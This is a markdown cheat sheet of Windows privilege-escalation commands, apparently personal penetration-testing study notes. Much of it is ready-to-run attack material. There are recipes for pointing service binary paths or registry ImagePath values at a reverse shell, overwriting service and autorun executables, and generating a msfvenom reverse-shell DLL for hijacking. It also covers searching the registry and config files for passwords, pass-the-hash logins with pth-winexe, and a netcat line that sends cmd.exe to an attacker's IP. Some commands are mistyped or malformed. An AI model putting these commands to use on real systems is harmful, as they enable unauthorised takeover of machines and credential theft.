###### Basic Privesc Emumeration for Windows
```
whoami
whoami /priv
---
net user // Discover other users
---
net user <user> // Enumerate info for selected user
---
hostname
---
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" // View System Info
---
tasklist /SVC // Processes
---
ipconfig /all
---
route print // network routing tables 
---
netstat -ano // Veiw active network connections 
a = all active TCP connection
n = ip/ports
o = PID
```
###### Enumerating Firewalls for Windows
```
netsh advfirewall show currentprofile // Current firewall profile
---
netsh advfirewall firewall show rule name=all // Firewall rules
```
###### Enumerating Scheduled Tasks for Windows
```
schtasks /query /fo LIST /v // List Tasks
```
###### Enumerating installed applications for Windows
```
wmic product get name, version, vendor // Info on installed apps
---
wmic qfe get Caption, Description, HotFixID, InstalledOn // Full Sys updates
```
###### Enumerating R/W files for Windows
```
[Download accesschk.exe onto Target]
accesschk.exe -uws "Everyone" "<Path to DIR>" // Will check for w-W files 
---
[powershell]
Get-ChildItem "<PATH TO DIR>" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```
###### Kernel Exploits
```
Download systeminfo 
Run in on kali through windows-exploit-suggester
```
###### Service Commands
```
Query the configuation of a service:
- sc.exe qc <name>
Query the current status of a service
- sc.exe query <name>
Modify a configuration option of a service
- sc.exe config <name> <options>= <value>
Start/Stop a service <name>
- net start/stop <name>
```
###### Insecure Service Permissions 
```
Innocuous = SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS
Useful = SERVICE_STOP, SERVICE_START
Dangerous = SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS
-------
If you cant stop/start a service, it doesnt matter if you can change anytihng (rabbithole)

.\achesschk.exe /accepteula -uwcqv user <service> ###Checking access permissions

then

sc.exe qc <service> ### will show path/and if you can start manually, 

sc config <service> binpath= "\""C:\path\to\reverse\shell.exe"" #### set binary path to a reverse shell.

net start <service> ####start the service to get shell
--------
````
###### Unqouted Service Pahts
```

EXAMPLE C:\Program Files\Big Dir\Common files\SomeExecutable.exe

To execute the exe, windows first checks everything before it, with spaces and unqoutes. 

So remember in this instance. Program, Big, or Common could both be turned into .exe and pop a reverse shell

1 Check if you have permissions to start the service 
.\accesschk.exe \accepteula -ucqv user <unquotedsvc> 

2. Check for write permissions on each directory within the binary path
- .\accesschk.exe \accepteula -uwdq C:\
-- .\accesschk.exe \accepteula -uwdq "C:\Program Files"
--- .\accesschk.exe \accepteula -uwdq "C:\Program Files\Big Dir"

### so in this example, we are going to put a reverse shell in Big Dir called common.exe

```
###### Weak Registry Permissions
```
Modidy a services configuatiion rather than the service

Verify the permissions

- powershell -exec bypass

- PS: Get-Acl HKLM:\System\CurrentControlSet\Services\<regsvc> | Format-List 

- .\accesschk.exe \accepeula -uvwqk HKLM:\System\CurrentControlSet\Services\<regsvc>

Check to see if it can be start/stop

- .\accesschk.exe \accepeula -ucqv user <regsvc>

Check current values in the registry entry (i.e look for some sort of path, if it will execute as system) 

- reg query HKLM\System\CurrentControlSet\Services\regsvc

Change the path to match that of the reverse shell

- reg add HKLM\SYSTEM\CurrentControlSet\services\<regsvc> /v ImagePath /t REG_EXPAND_SZ /d C:\Privy\reverseshell.exe /f 

Start the sercive to pop da shellz
- net start <regsvc>
```
###### Insecure Service Executables
```
If a service exe is modifiable, can simply replace it with a reverse shell
back up the original service or you are != 1337

Check if the exe can be modified
- .\accesschk.exe /accepteula -quvw "C:\PATH\TO\SERVICE\EXECUTABLEService"

Can it be started and stoped
- ./acesschk.exe \accepteula -uvqc <EXECUTABLService>

backup the oringal (really good practice)
- copy "C:\PATH\TO\SERVICE\EXECUTABLEService" C:\Temp

Overwrite the oringal service executable

- copy \Y C:\privvy\reverse.exe "C:\PATH\TO\SERVICE\EXECUTABLEService"

Start the service to get poppin

- net start EXECUTABLEService

Copy the oringinal back for best practices
```
###### DLL Hijacking
```
A exe might try to load something from a dll, in short, we poisen the dll to get shell. the exe/dll will have to be executed as system to get a system shell 

- Need dll to be writable by user
- If a dll is missing, and user has write acess to that dir

Check to see if the DLL has start/stop
- accesschk.exe /accepteula -uvqc user <dll>

Check to see what exe it is tied too. (Look for biary path name, and to see if it executes as system)
- sc qc dllsvc 

Need to get the DLL locally, to debug 

Process Monitor the exact service, deslect registry and netowrk activity and then capture/ start the serivice/ will show you the dll search order. 

Create a dll shell.

- msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f dll -o /tools/<NAME OF HIJACKED DLL>.dll

Copy the .dll shell to the directory it would usually be called from.

net stop dllsvc

net start dllsvc

```
###### Registry
```
AutoRun application that are writable 

- reg query HKLM\SOFTWARE\MICROSOFT\WINDOWS\VERSION\Run 

Check acesss
- .\accesschk.exe \accepteula -wvu "C:\PATH\TO\VULN\prog.exe"

Back up the oringinal 

Overwirte the exe 
- copy /Y reverse.exe "C:\PATH\TO\VULN\prog.exe"

Restart windows
```
###### Always install evavated
```
If these are enabled
Query the registeR
```
###### Passwords
```
HKLM = Local Machine
HKCU = Current User

Query the registry
- reg query HKLM /f password /t REG_SZ /s
- reg query HKCU /f password /t REG_SZ /s

Verify found passwords
- reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" /s  ###these are not copy n paste, paths are always unique
- reg query "HKCU\software\place\PuTTY\sEssions" /s

to spawn shell
winexe -u --system 'admin%passowrd123' //targetip cmd.exe

---------------------------------------------------
RunAs

Check stored credentials
- cmdkey /list

to pop shell
runas /savedcred /user:admin C:\reverseshell.exe  
---------------------------------------------------
Config files
Recurisvily searcg files in the CWD with 'pass' or ending in .config
- dir /s *pass* == *.config

do the same but contain password and end in .xml .ini .txt 
- findstr \si password *.xml *.ini *.txt 

--------------------------------------------------
Useful backup locations 

C:\Windows\Repair 
C:\Winows\System32\config\RegBack 
--------------------------------------------------
SAMDUMP
PWDUMP
CREDDUMP7SUITE
-------------------------------------------------
Anatomy of the hash
NTLM STARTS WITH 31D6 USUALLY EMPTY HASH 
USER:501:LM:NTLM 
-------------------------------------------------

Logging in with the hash 
- pth-winexe --system -U "admin%LM:NTLM" //target-ip cmd.exe 

```
###### Schedualed Tasks
```
List all schedualed tasks 
- schtasks /query /fo LIST /v
Poweshell
- Get-ScheduledTask | where ($_.TaskPath -notlike "\Microsoft*") | ft TaskName,TaskPath,State 

Also look for logs that may indicate if any tasks are being run.

Check file permissions on a shecualed task script
- .\accsschk.exe /accepteula -quv user script.ps1

Back up the original

echo C:\path\to\reverse/exe >> script.ps1 

script will pop shell when the task is complete.
```
###### Installed Apps
```
```

###### Enumerating Unmounted Disks for Windows
```
mountvol
```
###### Enumerating Drivers and Kernal Modules for Windows
```
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start mod
e', Path // Lists display name, start mode and path
---
 Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"} //Target specific drivers
```
###### AutoElevate Binaries for Windows
```
regedit //opens Registry Editor 
---
reg query HKEY_CURRENT_USER
---
REG ADD HKCU\path\to\Shell\Open\command /v DelegateExecute /t REG_SZ
```
###### 
Insecure file permissions for Windows
```
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} // shows service/path
---

```
***
#### The Automated Stuff
###### Windows
```
windows-privesc-check2.exe // http://pentestmonkey.net/windows-privesc-check

windows-privesc-check2.exe--dump -G Dump Groups 
---
windows-privesc-check2.exe --dump -G -H // Dump Groups & Shares
---
windows-privesc-check2.exe --dump -M -V // Dump password policy & privs for users and groups
---
windows-privesc-check2.exe -A // All files and Dirs
--
windows-privesc-check2.exe --pyshell // o.O 
---
procmon.exe
---
sigcheck.exe -a -m C:\path\to\binarie
---
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"  //XP SP1 2001 
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
```
###### Windows
```
[Examples]

whoami /groups // Look for Medium integrity level
-
net user admin NewPassword // Try set new password (Most likely will fail)
-
powershell.exe Start-Process cmd.exe -Verb runAs // Privesc
```
```
wmic service where caption="Service" get name, caption, state, startmode // Check start mode and active status
---
pth-winexe -U <user>%<lm hash>:<NTLM hash> //<Target IP> cmd /// Pass the Hash 
```
